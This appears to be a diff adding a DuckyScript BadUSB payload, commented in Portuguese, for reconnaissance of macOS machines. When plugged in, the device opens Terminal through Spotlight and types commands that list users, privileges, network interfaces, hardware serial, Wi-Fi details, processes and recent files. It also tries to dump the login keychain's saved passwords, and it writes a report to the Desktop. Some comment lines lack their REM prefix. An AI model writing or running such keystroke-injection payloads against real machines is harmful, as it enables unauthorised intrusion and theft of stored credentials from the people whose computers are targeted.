@@ -1,0 +1,52 @@
+REM =================================================================
+REM Ataque BadUSB - Reconhecimento MacOS Completo
+REM =================================================================
+REM
+REM Descrição: Script BadUSB para coleta completa de informações do
+REM sistema MacOS, incluindo rede, usuários e privilégios.
+REM
+ Quando usar: Para mapear sistemas MacOS e identificar pontos de
+REM entrada e privilégios de acesso.
+REM
+ Como usar: Conectar o dispositivo BadUSB e o script será executado
+REM automaticamente.
+REM
+ Observações: Requer terminal aberto. Modifique os comandos conforme
+REM necessário para diferentes versões do MacOS.
+REM
+=================================================================
+
+DELAY 1000
+
+Abre o Spotlight
+GUI SPACE
+DELAY 500
+
+Busca pelo Terminal
+STRING Terminal
+DELAY 500
+ENTER
+DELAY 1000
+
+Coleta informações completas do sistema
+STRING echo "=== RECONHECIMENTO DO SISTEMA MACOS ===" && echo
+STRING echo "=== Usuário e Host ===" && whoami && hostname && echo
+STRING echo "=== Interfaces de Rede ===" && ifconfig | grep "inet " | grep -v "127.0.0.1" && echo
+STRING echo "=== Todos os Usuários ===" && dscl . list /Users | grep -v "^_" && echo
+STRING echo "=== Privilégios do Usuário ===" && id && echo
+STRING echo "=== Informações do Sistema ===" && system_profiler SPHardwareDataType | grep -E "(Model Name|Processor|Memory|Serial Number)" && echo
+STRING echo "=== Redes WiFi Salvas ===" /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -I && echo
+STRING echo "=== Processos Ativos ===" && ps aux | head -15 && echo
+STRING echo "=== Arquivos Recentes ===" && ls -la ~/Documents ~/Downloads 2>/dev/null | head -10 && echo
+STRING echo "=== Senhas Salvas (Keychain) ===" && security dump-keychain -d ~/Library/Keychains/login.keychain 2>/dev/null | head -5 || echo "Não foi possível acessar Keychain"
+
+ENTER
+
+Salva as informações em arquivo
+STRING echo "Reconhecimento MacOS completo em $(date)" > ~/Desktop/recon_macos_report.txt 2>/dev/null || echo "Não foi possível salvar relatório"
+
+ENTER
+
+Fecha o terminal
+STRING exit
+ENTER
